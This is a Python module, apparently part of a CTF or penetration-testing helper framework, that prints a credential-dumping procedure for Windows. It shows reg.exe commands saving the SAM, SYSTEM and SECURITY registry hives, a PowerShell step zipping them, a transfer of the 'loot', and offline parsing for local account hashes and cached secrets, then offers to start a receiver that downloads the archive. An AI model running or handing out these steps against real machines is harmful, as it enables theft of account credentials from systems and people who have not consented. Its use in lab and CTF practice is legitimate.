from core.runner import run_module_by_name
import subprocess


def run(data, cred, args):
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    W_BOLD = '\033[1m'

    print(f"\n{W_BOLD}[*] REGISTRY HIVE EXPORT (SAM / SYSTEM / SECURITY){W}")

    # =========================================================
    # EXPORT HIVES
    # =========================================================

    print(f"\n{W_BOLD}[*] Export Registry Hives:{W}")

    print(f"      {Y}reg.exe save HKLM\\SAM SAM{W}")
    print(f"      {Y}reg.exe save HKLM\\SYSTEM SYSTEM{W}")
    print(f"      {Y}reg.exe save HKLM\\SECURITY SECURITY{W}")

    # =========================================================
    # CREATE ZIP
    # =========================================================

    print(f"\n{W_BOLD}[*] Package Hives Into ZIP:{W}")

    print(
        f"      {Y}powershell Compress-Archive "
        f"-Path SAM,SYSTEM,SECURITY "
        f"-DestinationPath hives.zip{W}"
    )

    # =========================================================
    # DOWNLOAD
    # =========================================================

    print(f"\n{W_BOLD}[*] Transfer Loot:{W}")

    print(
        f"      {C}ctf download.windows hives.zip{W}"
    )

    # =========================================================
    # PARSE
    # =========================================================

    print(f"\n{W_BOLD}[*] Parse Offline:{W}")

    print(
        f"      {C}ctf dump.hives hives.zip{W}"
    )

    # =========================================================
    # NOTES
    # =========================================================

    print(f"\n{W_BOLD}[*] Notes:{W}")

    print(
        f"      {G}Requires local administrator privileges{W}"
    )

    print(
        f"      {G}SAM + SYSTEM = local account hashes{W}"
    )

    print(
        f"      {G}SECURITY may contain cached credentials and secrets{W}\n"
    )

    answer = input(
        "Start receiver now? [Y/n]: "
    )

    if answer == 'Y' or answer == "y": 

        run_module_by_name("download.windows", ["hives.zip"], data)




    return data